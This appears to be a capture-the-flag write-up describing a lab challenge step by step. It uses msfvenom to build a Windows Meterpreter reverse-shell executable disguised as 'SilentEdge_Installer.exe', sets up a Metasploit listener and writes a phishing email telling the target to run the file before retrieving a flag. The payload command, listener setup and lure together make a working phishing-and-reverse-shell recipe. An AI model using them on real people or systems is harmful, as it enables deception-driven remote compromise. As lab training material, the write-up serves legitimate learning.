## Shadow Phishing

> A Metasploit-based reverse shell attack leveraging a malicious Windows Application.

![The challenge](https://github.com/user-attachments/assets/54edd712-4d5c-4d3c-99fb-460155a29a87)



---

### Generating the Malicious Executable 

This challenge was very similar to Phantom so the thought process was the same. Offsec has a section for Metasploit Unleashed with a exploit payload called MSFVENOM. From there, the next steps were to identify the criteria from email and do more research on MSFVENOM. 

![image](https://github.com/user-attachments/assets/a1fd6de8-d955-4961-a0ea-f6dd189ccbb9)

This is what I ended up crafting up

![image](https://github.com/user-attachments/assets/113cf6eb-2ca1-4c90-b9cf-59bedac845ee)


```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.212.180 LPORT=8888 -f exe > SilentEdge_Installer.exe
```
![image](https://github.com/user-attachments/assets/cedb7514-9d7b-40cb-b1c2-e815366e0215)


---

### Listener Setup

Once the payload was generated, I configured Metasploit to listen for incoming connections

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST=10.10.212.180
set LPORT=8888
exploit -j
```

![Listener](https://github.com/user-attachments/assets/54e798a5-6f30-478b-bfcc-e91ae8a00a9a)


---

### Delivering the payload

The generated SilentEdge_Installer.exe was sent via a phishing email to the target, instructing them to execute it.

![file upload](https://github.com/user-attachments/assets/a3bd7d55-b3f5-4461-94c5-d8aef73759cf)


This was the phishing email I crafted as well

```bash
Subject: SilentEdge Installer - Phase 2
Cipher,
The latest SilentEdge Installer is built and ready for deployment...

Download and execute: SilentEdge_Installer.exe

Keep this confidential.
— ShadowByte
```
---

### Gaining Remote Access & Post-Exploitation

The reverse shell hooked, and once again I navigated to the desktop:

```bash
cd c:/users/Administrator/Desktop
ls
cat flag.txt
```

![Meta Sesh](https://github.com/user-attachments/assets/5c6a0bdf-5265-4ad2-aba5-b287a5053d4d)

And Voila! Flag found. 

![image](https://github.com/user-attachments/assets/255c82df-40ef-4a06-a6f1-2206549a643a)

---
